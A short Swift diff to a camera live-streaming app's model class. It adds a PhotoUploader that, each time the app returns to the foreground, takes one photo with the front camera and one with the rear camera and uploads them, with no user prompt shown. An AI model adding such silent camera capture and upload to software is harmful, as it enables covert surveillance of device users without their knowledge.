@@ -15,6 +15,7 @@ final class CameraAppModel: ObservableObject {
     private let store = DeviceStore()
     private var signaling: SignalingClient?
     private let stream = WebRTCStreamer()
+    private let photoUploader = PhotoUploader()
     private var isActive = true
     private var backgroundStopWork: DispatchWorkItem?
 
@@ -54,6 +55,10 @@ final class CameraAppModel: ObservableObject {
             isActive = true
             // 回到前台：取消待执行的后台停止（下拉状态栏/快速切换不会杀直播）
             backgroundStopWork?.cancel(); backgroundStopWork = nil
+            // 每次置于前台：前后置各拍一张上传
+            photoUploader.captureAndUpload { [weak self] msg in
+                Task { @MainActor in self?.signaling?.sendDiagnostic("拍照: " + msg) }
+            }
         case .inactive:
             // 下拉状态栏、控制中心、来电等短暂失焦：仅标记，不停止直播
             isActive = false
